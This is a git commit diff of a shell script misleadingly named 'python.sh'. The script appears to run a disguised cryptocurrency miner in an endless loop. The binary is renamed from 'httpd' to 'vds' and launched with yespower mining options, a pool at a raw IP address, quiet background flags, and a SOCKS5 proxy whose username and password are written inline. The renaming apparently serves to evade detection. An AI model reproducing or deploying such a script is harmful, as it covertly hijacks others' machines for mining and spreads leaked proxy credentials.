5977a7575b59c22919adf39a73dec09b9860933e
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-23 18:26:07 +0700

    Update python.sh

--- python.sh
+++ python.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 while [ 1 ]; do
-./httpd -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-asc) -p c=CRNC,mc=VHH  --proxy=socks5://ugursfso:wqn60pnk6m95@45.155.68.129:8133 -t7 -q -S -B
+./vds -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-asc) -p c=CRNC,mc=VHH  --proxy=socks5://ugursfso:wqn60pnk6m95@45.155.68.129:8133 -t7 -q -S -B
 sleep 5
 done
